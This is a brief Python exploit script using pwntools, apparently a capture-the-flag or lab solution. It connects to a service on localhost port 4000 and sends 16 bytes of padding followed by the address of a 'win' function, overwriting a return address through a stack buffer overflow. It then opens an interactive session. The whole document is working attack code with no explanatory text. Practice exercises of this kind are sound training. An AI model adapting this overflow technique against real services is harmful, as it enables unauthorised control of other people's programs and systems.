from pwn import *

r = remote('localhost', 4000)

offset = 16
win = 0x0000000000401146

payload = b'A' * 16
payload += p64(win)

r.sendline(payload)
r.interactive()
